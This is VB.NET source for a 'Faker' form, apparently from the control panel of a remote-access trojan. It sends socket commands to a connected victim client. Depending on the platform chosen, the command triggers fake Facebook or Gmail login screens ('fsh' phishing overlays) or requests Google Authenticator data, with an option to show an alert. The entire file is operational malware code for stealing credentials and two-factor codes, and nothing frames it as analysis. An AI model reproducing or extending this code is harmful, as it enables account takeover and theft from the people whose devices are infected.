Public Class Faker
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Client
     Public DownloadsFolder As String
     Public Title As String = "null"
    Private Sub MetroSetButton1_Click(sender As Object, e As EventArgs) Handles MetroSetButton1.Click
        If platfromtext.Text.Length < 2 Then
            MsgBox("Select Platform First!!!")
            Return
        Else
            If Me.classClient IsNot Nothing Then
                Try
                     Dim spl As String() = classClient.Keys.Split(":")
                     Dim cmand As String = ""
                     If Checkalert.Switched Then
                        cmand = "1:"
                    Else
                        cmand = "0:"
                    End If
                     If platfromtext.Text = "Facebook" Then
                        cmand += "fb:fsh"
                    ElseIf platfromtext.Text = "Gmail" Then
                        cmand += "go:fsh"
                    ElseIf platfromtext.Text = "google authenticator" Then
                         Dim objss As Object() = {Client, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "goauth<*>" & "X" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), classClient}
                         classClient.SendAsync(objss)
                        Return
                    End If
                     Dim objs As Object() = {Client, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & cmand & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), classClient}
                     classClient.SendAsync(objs)
                Catch ex As Exception
                 End Try
            End If
        End If
    End Sub
End Class